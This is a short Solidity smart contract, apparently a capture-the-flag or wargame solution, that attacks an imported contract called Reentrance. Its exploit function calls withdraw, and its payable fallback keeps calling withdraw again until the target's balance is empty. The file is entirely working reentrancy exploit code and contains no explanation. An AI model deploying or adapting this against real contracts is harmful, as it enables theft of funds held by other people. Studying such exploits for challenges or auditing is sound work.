// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceExploit {
    uint private amount;
    Reentrance reentrance;

    constructor(address _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function exploit(uint _amount) external {
        amount = _amount;
        reentrance.withdraw(amount);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
}
